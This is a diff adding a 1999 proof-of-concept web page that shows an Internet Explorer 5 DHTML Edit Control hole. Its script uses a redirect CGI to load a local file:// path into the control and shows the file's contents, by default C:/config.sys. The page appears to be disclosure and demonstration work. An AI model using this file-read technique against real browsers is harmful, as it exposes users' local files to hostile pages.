@@ -1,0 +1,66 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="keywords"
+content="cuartango,dhtmle hole,dhtmle hole,IE5,IE 5 hole,IE 5,cuartango hole,cuartango,security,security site,security web,hack,security,risk,hole,security hole,explorer">
+<title>DHTMLE vulnerabilities</title>
+</head>
+
+<body>
+<script>
+function Load()
+{
+if (T1.value == "") T1.value="C:/config.sys";
+dh.LoadURL("http://cuartangojc.virtualave.net/cgi-bin/redirect.cgi?file://" + T1.value);
+window.setTimeout("GetFile()",1000);
+}
+function GetFile()
+{
+alert(dh.DOM.body.innerText);
+}
+function Done()
+{
+alert("done");
+}
+</script>
+
+
+<h1 align="center"><small><font color="#FF0000">T<strong>he&nbsp; DHTML Editor file access
+hole</strong></font></small></h1>
+<div align="left">
+
+<table border="0" width="765" height="286">
+  <tr>
+    <td width="246" height="257" valign="top">&nbsp;<p><small><font face="Arial">The box in the
+    right is an DHTML Edit Control Safe for scripting. It will be used to read a file from
+    your computer.</font></small></p>
+    <p><small><font face="Arial">Type a file name (if left blank I will display your <a
+    href="file:///c:/config.sys">c:\config.sys</a> file)</font></small></p>
+    <p align="center"><input type="text" name="T1" size="20"></p>
+    <p align="center"><small><font face="Arial"><input type="button" value="Show me the file"
+    name="B1" onclick="Load()"><br>
+    <small>Click and wait few seconds</small></font></small></td>
+    <td width="511" height="257" valign="top">
+    <object classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A" width="497" height="248"
+    id="dh">
+    </object>
+    <script>
+</script> </td>
+  </tr>
+</table>
+</div>
+
+<p align="center"><a href="dhtmle1.html"><font face="Arial">Back to DTHMLE Vulnerabilities<br>
+<br>
+</font></a><font color="#400040">Created by</font> <a
+href="mailto:cuartangojc@mx3.redestb.es">Juan Carlos Garcia Cuartango</a> </p>
+
+<p align="center"><font face="Arial"><img src="/cgi-bin/Count.cgi" width="97" height="24"><small><br>
+</small><font size="1">Visitors since March 25 Año del Señor de 1999</font></font></p>
+
+<p><small>Last update April 20 Año del señor de 1999</small></p>
+
+<p>&nbsp;</p>
+</body>
+</html>
